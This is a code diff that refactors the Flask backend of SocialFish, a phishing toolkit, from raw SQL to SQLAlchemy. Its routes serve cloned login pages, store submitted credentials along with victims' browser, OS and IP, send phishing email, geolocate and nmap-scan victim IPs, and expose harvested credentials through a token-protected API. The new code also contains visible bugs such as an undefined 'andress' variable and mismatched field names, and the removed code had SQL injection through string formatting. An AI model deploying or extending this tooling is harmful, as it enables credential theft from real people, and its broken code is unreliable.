@@ -11,35 +11,24 @@ from datetime import date
 
 import colorama
 import sqlite3
-import flask_login
+from flask_login import current_user, login_user, login_required, logout_user
 import os
 
-from .models import User
-
+from .auth import User
+from .models import SocialFish as social_log
+from .models import Creds, db, Sfmail, Professionals, Companies
 
 socialbp = Blueprint('socialbp', __name__)
 
-# Conta o numero de credenciais salvas no banco
 def countCreds():
-    count = 0
-    cur = g.db
-    select_all_creds = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc")
-    for i in select_all_creds:
-        count += 1
-    return count
+    "Conta o numero de credenciais salvas no banco"
+    count_creds = len(Creds.query.all())
+    return count_creds
 
-# Conta o numero de visitantes que nao foram pegos no phishing
 def countNotPickedUp():
-    count = 0
-
-    cur = g.db
-    select_clicks = cur.execute("SELECT clicks FROM socialfish where id = 1")
-
-    for i in select_clicks:
-        count = i[0]
-
-    count = count - countCreds()
-    return count
+    "Conta o numero de visitantes que nao foram pegos no phishing"
+    count = social_log.query.first().clicks
+    return count - countCreds()
 
 
 # Rota para o caminho de inicializacao, onde e possivel fazer login
@@ -48,7 +37,7 @@ def admin():
     # se a requisicao for get
     if request.method == 'GET':
         # se o usuario estiver logado retorna para a pagina de credenciais
-        if flask_login.current_user.is_authenticated:
+        if current_user.is_authenticated:
             return redirect('/creds')
         # caso contrario retorna para a pagina de login
         else:
@@ -60,7 +49,7 @@ def admin():
         user = User.query.filter_by(username=email).first()
         password = request.form['password']
         if user is not None and user.verify_password(password):
-            flask_login.login_user(user)
+            login_user(user)
             return redirect('/creds')
         flash('Invalid username or password.')
         
@@ -74,9 +63,10 @@ def getLogin():
         agent = request.headers.get('User-Agent').encode('ascii', 'ignore').decode('ascii')
         clone(url, agent, beef)
         o = url.replace('://', '-')
-        cur = g.db
-        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
-        g.db.commit()
+        social_db_obj = social_log.query.first()
+        social_db_obj.clicks = social_db_obj.clicks + 1
+        db.session.add(social_db_obj)
+        db.session.commit()
         template_path = os.path.join('fake', agent, o, 'index.html')
         return render_template(template_path)
     # caso seja a url padrao
@@ -84,9 +74,10 @@ def getLogin():
         return render_template('default.html')
     # caso seja configurada para custom
     else:
-        cur = g.db
-        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
-        g.db.commit()
+        social_db_obj = social_log.query.first()
+        social_db_obj.clicks = social_db_obj.clicks + 1
+        db.session.add(social_db_obj)
+        db.session.commit()
         return render_template('custom.html')
 
 # funcao onde e realizado o login por cada pagina falsa
@@ -101,11 +92,11 @@ def postData():
         platform = str(request.user_agent.platform)
         rip = str(request.remote_addr)
         d = "{:%m-%d-%Y}".format(date.today())
-        cur = g.db
-        sql = "INSERT INTO creds(url,jdoc,pdate,browser,bversion,platform,rip) VALUES(?,?,?,?,?,?,?)"
-        creds = (url, str(data), d, browser, bversion, platform, rip)
-        cur.execute(sql, creds)
-        g.db.commit()
+
+        creds_obj = Creds(url=url, jdoc=str(data), pdate=d, browser=browser, bversion=bversion, platform=platform, rip=rip)
+        db.session.add(creds_obj)
+        db.session.commit()
+
     return redirect(red)
 
 # funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
@@ -129,32 +120,33 @@ def echo():
     else:
         url = 'https://github.com/UndeadSec/SocialFish'
         red = 'https://github.com/UndeadSec/SocialFish'
-    cur = g.db
-    cur.execute("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
-    g.db.commit()
+        
+    social_db_obj = social_log.query.first()
+    social_db_obj.attacks = social_db_obj.attacks + 1
+    db.session.add(social_db_obj)
+    db.session.commit()
     return redirect('/creds')
 
 # pagina principal do dashboard
 @socialbp.route("/creds")
-@flask_login.login_required
+@login_required
 def getCreds():
-    cur = g.db
-    attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
-    clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-    data = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc").fetchall()
-    return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=tokenapi)
+    social_db_obj = social_log.query.first()
+    attacks = social_db_obj.attacks
+    clicks = social_db_obj.clicks
+    token = social_db_obj.token
+    data = Creds.query.all()
+    return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=token)
 
 # pagina para envio de emails
 @socialbp.route("/mail", methods=['GET', 'POST'])
-@flask_login.login_required
+@login_required
 def getMail():
     if request.method == 'GET':
-        cur = g.db
-        email = cur.execute("SELECT email FROM sfmail where id = 1").fetchone()[0]
-        smtp = cur.execute("SELECT smtp FROM sfmail where id = 1").fetchone()[0]
-        port = cur.execute("SELECT port FROM sfmail where id = 1").fetchone()[0]
+        data_mail = Sfmail.query.first()
+        email, smtp, port = data_mail.email, data_mail.smtp, data_mail.port
         return render_template('admin/mail.html', email=email, smtp=smtp, port=port)
+
     if request.method == 'POST':
         subject = request.form['subject']
         email = request.form['email']
@@ -164,23 +156,24 @@ def getMail():
         smtp = request.form['smtp']
         port = request.form['port']
         sendMail(subject, email, password, recipient, body, smtp, port)
-        cur = g.db
-        cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
-        cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
-        cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
-        g.db.commit()
+
+        mail = Sfmail.query.first()
+        mail.email = email
+        mail.smtp = smtp
+        mail.port = port
+        db.session.add(mail)
+        db.session.commit()
+
         return redirect('/mail')
 
 # Rota para consulta de log 
 @socialbp.route("/single/<id>", methods=['GET'])
-@flask_login.login_required
+@login_required
 def getSingleCred(id):
     try:
-        sql = "SELECT jdoc FROM creds where id = {}".format(id)
-        cur = g.db
-        credInfo = cur.execute(sql).fetchall()
+        credInfo = Creds.query.get(id)
         if len(credInfo) > 0:
-            return render_template('admin/singlecred.html', credInfo=credInfo)
+            return render_template('admin/singlecred.html', credInfo=credInfo.jdoc)
         else:
             return "Not found"
     except:
@@ -188,7 +181,7 @@ def getSingleCred(id):
 
 # rota para rastreio de ip
 @socialbp.route("/trace/<ip>", methods=['GET'])
-@flask_login.login_required
+@login_required
 def getTraceIp(ip):
     try:
         traceIp = tracegeoIp(ip)
@@ -198,53 +191,52 @@ def getTraceIp(ip):
 
 # rota para scan do nmap
 @socialbp.route("/scansf/<ip>", methods=['GET'])
-@flask_login.login_required
+@login_required
 def getScanSf(ip):
     return render_template('admin/scansf.html', nScan=nScan, ip=ip)
 
 # rota post para revogar o token da api
 @socialbp.route("/revokeToken", methods=['POST'])
-@flask_login.login_required
+@login_required
 def revokeToken():
     revoke = request.form['revoke']
     if revoke == 'yes':
-        cur = g.db
-        upsql = "UPDATE socialfish SET token = '{}' where id = 1".format(genToken())
-        cur.execute(upsql)
-        g.db.commit()
-        token = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-        genQRCode(token, revoked=True)
+        social_db_obj = social_log.query.first()
+        social_db_obj.token = genToken()
+        db.session.add(social_db_obj)
+        db.session.commit()
+        genQRCode(social_db_obj.token, revoked=True)
     return redirect('/creds')
 
 # pagina para gerar relatorios
 @socialbp.route("/report", methods=['GET', 'POST'])
-@flask_login.login_required
+@login_required
 def getReport():
     if request.method == 'GET':
-        cur = g.db
-        urls = cur.execute("SELECT DISTINCT url FROM creds").fetchall()
-        users = cur.execute("SELECT name FROM professionals").fetchall()
-        companies = cur.execute("SELECT name FROM companies").fetchall()
+        urls = [url for url in db.session.query(Creds.url).distinct()]
+        users = [professional for professional in db.session.query(Professionals.name)]
+        companies = [company for company in db.session.query(Companies.name)]
         uniqueUrls = []
         for u in urls:
             if u not in uniqueUrls:
                 uniqueUrls.append(u[0])
         return render_template('admin/report.html', uniqueUrls=uniqueUrls, users=users, companies=companies)
+
     if request.method == 'POST':
         subject = request.form['subject']
         user = request.form['selectUser']
         company = request.form['selectCompany']
         date_range = request.form['datefilter']
         target = request.form['selectTarget']
-        _target = 'All' if target=='0' else target
-        DATABASE = current_app.config['DATABASE']
-        genReport(DATABASE, subject, user, company, date_range, _target)
-        generate_unique(DATABASE,_target)
+        target = 'All' if target=='0' else target
+        DATABASE = current_app.config['SQLALCHEMY_DATABASE_URI']
+        genReport(subject, user, company, date_range, target)
+        generate_unique(target)
         return redirect('/report')
 
 # pagina para cadastro de profissionais
 @socialbp.route("/professionals", methods=['GET', 'POST'])
-@flask_login.login_required
+@login_required
 def getProfessionals():
     if request.method == 'GET':
         return render_template('admin/professionals.html')
@@ -252,16 +244,14 @@ def getProfessionals():
         name = request.form['name']
         email = request.form['email']
         obs = request.form['obs']
-        sql = "INSERT INTO professionals(name,email,obs) VALUES(?,?,?)"
-        info = (name, email, obs)
-        cur = g.db
-        cur.execute(sql, info)
-        g.db.commit()
+        prof = Professionals(name=name,email=email,obs=obs)
+        db.session.add(prof)
+        db.session.commit()
         return redirect('/professionals')
 
 # pagina para cadastro de empresas
 @socialbp.route("/companies", methods=['GET', 'POST'])
-@flask_login.login_required
+@login_required
 def getCompanies():
     if request.method == 'GET':
         return render_template('admin/companies.html')
@@ -271,16 +261,14 @@ def getCompanies():
         phone = request.form['phone']
         address = request.form['address']
         site = request.form['site']
-        sql = "INSERT INTO companies(name,email,phone,address,site) VALUES(?,?,?,?,?)"
-        info = (name, email, phone, address, site)
-        cur = g.db
-        cur.execute(sql, info)
-        g.db.commit()
+        company = Companies(name, email, phone, andress, site)
+        db.session.add(company)
+        db.session.commit()
         return redirect('/companies')
 
 # rota para gerenciamento de usuarios
 @socialbp.route("/sfusers/", methods=['GET'])
-@flask_login.login_required
+@login_required
 def getSfUsers():
     return render_template('admin/sfusers.html')
 
@@ -289,7 +277,7 @@ def getSfUsers():
 
 @socialbp.route('/logout')
 def logout():
-    flask_login.logout_user()
+    logout_user()
     return 'Logged out'
 
 #--------------------------------------------------------------------------------------------------------------------------------
@@ -298,22 +286,20 @@ def logout():
 # VERIFICAR CHAVE 
 @socialbp.route("/api/checkKey/<key>", methods=['GET'])
 def checkKey(key):
-    cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-    if key == tokenapi:
+    token = social_log.query.get(1).token
+    if key == token:
         status = {'status':'ok'}
     else:
         status = {'status':'bad'}
     return jsonify(status)
 
 @socialbp.route("/api/statistics/<key>", methods=['GET'])
-def getStatics(key):    
-    cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-    if key == tokenapi:
-        cur = g.db
-        attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
-        clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
+def getStatics(key):
+    social_db_obj = social_log.query.get(1)
+    token = social_db_obj.token
+    if key == token:
+        attacks = social_db_obj.attacks
+        clicks = social_db_obj.clicks
         countC = countCreds()
         countNPU = countNotPickedUp()
         info = {'status':'ok','attacks':attacks, 'clicks':clicks, 'countCreds':countC, 'countNotPickedUp':countNPU}
@@ -323,17 +309,23 @@ def getStatics(key):
 
 @socialbp.route("/api/getJson/<key>", methods=['GET'])
 def getJson(key): 
-    cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-    if key == tokenapi:
+    social_db_obj = social_log.query.get(1)
+    token = social_db_obj.token
+    if key == token:
         try:
-            sql = "SELECT * FROM creds"
-            cur = g.db
-            credInfo = cur.execute(sql).fetchall()
+            creds = Creds.query.all()
             listCreds = []
-            if len(credInfo) > 0:
-                for c in credInfo:
-                    cred = {'id':c[0],'url':c[1], 'post':c[2], 'date':c[3], 'browser':c[4], 'version':c[5],'os':c[6],'ip':c[7]}
+            if len(creds) > 0:
+                for c in creds:
+                    cred = {'id':c.id,
+                            'url':c.url,
+                            'post':c.post,
+                            'date':c.date,
+                            'browser':c.browser,
+                            'version':c.version,
+                            'os':c.os,
+                            'ip':c.rip,
+                            }
                     listCreds.append(cred)
             else:
                 credInfo = {'status':'nothing'}
@@ -349,9 +341,9 @@ def postConfigureApi():
     global url, red, sta, beef
     if request.is_json:
         content = request.get_json()
-        cur = g.db
-        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-        if content['key'] == tokenapi:
+        social_db_obj = social_log.query.get(1)
+        token = social_db_obj.token
+        if content['key'] == token:
             red = content['red']
             beef = content['beef']
             if content['sta'] == 'clone':
@@ -370,9 +362,9 @@ def postConfigureApi():
                     red = 'http://' + red
             else:
                 red = 'https://github.com/UndeadSec/SocialFish'
-            cur = g.db
-            cur.execute("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
-            g.db.commit()
+            social_db_obj.attacks = social_db_obj.attacks + 1
+            db.session.add(social_db_obj)
+            db.session.commit()
             status = {'status':'ok'}
         else:
             status = {'status':'bad'}
@@ -384,9 +376,10 @@ def postConfigureApi():
 def postSendMail():
     if request.is_json:
         content = request.get_json()
-        cur = g.db
-        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-        if content['key'] == tokenapi:
+        social_db_obj = social_log.query.get(1)
+        token = social_db_obj.token
+        mail = Sfmail.query.get(1)
+        if content['key'] == token:
             subject = content['subject']
             email = content['email']
             password = content['password']
@@ -395,11 +388,11 @@ def postSendMail():
             smtp = content['smtp']
             port = content['port']
             if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':
-                cur = g.db
-                cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
-                cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
-                cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
-                g.db.commit()
+                mail.email = email
+                mail.smtp = smtp
+                mail.port = port
+                db.session.add(mail)
+                db.session.commit()
                 status = {'status':'ok'}
             else:
                 status = {'status':'bad','error':str(sendMail(subject, email, password, recipient, body, smtp, port))}
@@ -411,9 +404,9 @@ def postSendMail():
 
 @socialbp.route("/api/trace/<key>/<ip>", methods=['GET'])
 def getTraceIpMob(key, ip):
-    cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-    if key == tokenapi:
+    social_db_obj = social_log.query.get(1)
+    token = social_db_obj.token
+    if key == token:
         try:
             traceIp = tracegeoIp(ip)
             return jsonify(traceIp)
@@ -426,9 +419,9 @@ def getTraceIpMob(key, ip):
 
 @socialbp.route("/api/scansf/<key>/<ip>", methods=['GET'])
 def getScanSfMob(key, ip):
-    cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-    if key == tokenapi:
+    social_db_obj = social_log.query.get(1)
+    token = social_db_obj.token
+    if key == token:
         return jsonify(nScan(ip))
     else:
         content = {'status':'bad'}
@@ -436,12 +429,12 @@ def getScanSfMob(key, ip):
 
 @socialbp.route("/api/infoReport/<key>", methods=['GET'])
 def getReportMob(key):
-    cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-    if key == tokenapi:
-        urls = cur.execute("SELECT url FROM creds").fetchall()
-        users = cur.execute("SELECT name FROM professionals").fetchall()
-        comp = cur.execute("SELECT name FROM companies").fetchall()
+    social_db_obj = social_log.query.get(1)
+    token = social_db_obj.token
+    if key == token:
+        urls = db.session.query(Creds.url).all()
+        users = db.session.query(Professionals.name).all()
+        comp = db.session.query(Companies.name).all()
         uniqueUrls = []
         professionals = []
         companies = []
